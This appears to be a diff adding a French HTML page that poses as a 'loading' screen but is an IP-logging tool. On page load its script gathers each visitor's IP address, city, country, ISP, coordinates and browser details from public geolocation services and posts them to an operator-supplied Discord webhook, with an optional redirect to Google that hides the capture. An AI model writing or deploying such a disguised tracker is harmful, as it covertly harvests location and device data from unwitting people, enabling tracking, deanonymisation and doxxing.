@@ -1,1 +1,138 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chargement...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background: #0a0a0a;
+      color: #e0e0e0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .card {
+      background: #141414;
+      border: 1px solid #2a2a2a;
+      border-radius: 12px;
+      padding: 2rem;
+      max-width: 420px;
+      width: 90%;
+      text-align: center;
+    }
+    h1 { font-size: 1.25rem; margin-bottom: 0.5rem; color: #fff; }
+    p { color: #888; font-size: 0.9rem; margin-bottom: 1.5rem; }
+    .status {
+      background: #1a1a1a;
+      border-radius: 8px;
+      padding: 1rem;
+      font-family: ui-monospace, monospace;
+      font-size: 0.85rem;
+      color: #4ade80;
+      word-break: break-all;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Chargement en cours...</h1>
+    <p>Veuillez patienter un instant.</p>
+    <div id="status" class="status">Récupération des infos...</div>
+  </div>
 
+  <script>
+    // === CONFIG ===
+    // Colle ton webhook Discord ici (crée un webhook dans un salon Discord)
+    const WEBHOOK_URL = "REMPLACE_PAR_TON_WEBHOOK";
+    const SEND_TO_WEBHOOK = true;
+
+    async function getIP() {
+      const endpoints = [
+        "https://api.ipify.org?format=json",
+        "https://ipapi.co/json/",
+        "https://api.ip.sb/geoip",
+        "https://ipinfo.io/json"
+      ];
+      for (const url of endpoints) {
+        try {
+          const res = await fetch(url, { cache: "no-store" });
+          if (!res.ok) continue;
+          const data = await res.json();
+          return {
+            ip: data.ip || data.query || null,
+            city: data.city || null,
+            region: data.region || data.regionName || null,
+            country: data.country_name || data.country || data.countryCode || null,
+            isp: data.org || data.isp || data.as || null,
+            lat: data.latitude || data.lat || null,
+            lon: data.longitude || data.lon || null,
+            timezone: data.timezone || null
+          };
+        } catch (e) { continue; }
+      }
+      return null;
+    }
+
+    function collectClientInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio },
+        viewport: { width: window.innerWidth, height: window.innerHeight },
+        referrer: document.referrer || "direct",
+        url: window.location.href,
+        timestamp: new Date().toISOString()
+      };
+    }
+
+    async function sendLog(payload) {
+      if (!SEND_TO_WEBHOOK || !WEBHOOK_URL || WEBHOOK_URL.includes("REMPLACE")) {
+        console.log("[local] ", payload);
+        return;
+      }
+      const content = {
+        embeds: [{
+          title: "Nouveau clic / IP log",
+          color: 0x4ade80,
+          fields: [
+            { name: "IP", value: payload.ip || "?", inline: true },
+            { name: "Pays", value: payload.country || "?", inline: true },
+            { name: "Ville", value: payload.city || "?", inline: true },
+            { name: "ISP", value: payload.isp || "?", inline: false },
+            { name: "User-Agent", value: (payload.client.userAgent || "").slice(0, 200), inline: false },
+            { name: "Referrer", value: payload.client.referrer, inline: false },
+            { name: "Heure", value: payload.client.timestamp, inline: false }
+          ]
+        }]
+      };
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(content),
+          mode: "no-cors"
+        });
+      } catch (e) {}
+    }
+
+    (async () => {
+      const statusEl = document.getElementById("status");
+      const geo = await getIP();
+      const client = collectClientInfo();
+      const payload = { ...geo, client };
+      if (geo && geo.ip) {
+        statusEl.textContent = `IP: ${geo.ip}\n${geo.city || ""} ${geo.country || ""}`.trim();
+      } else {
+        statusEl.textContent = "Impossible de récupérer l'IP";
+      }
+      await sendLog(payload);
+      // setTimeout(() => { window.location.href = "https://google.com"; }, 1500); // optionnel redirect
+    })();
+  </script>
+</body>
+</html>
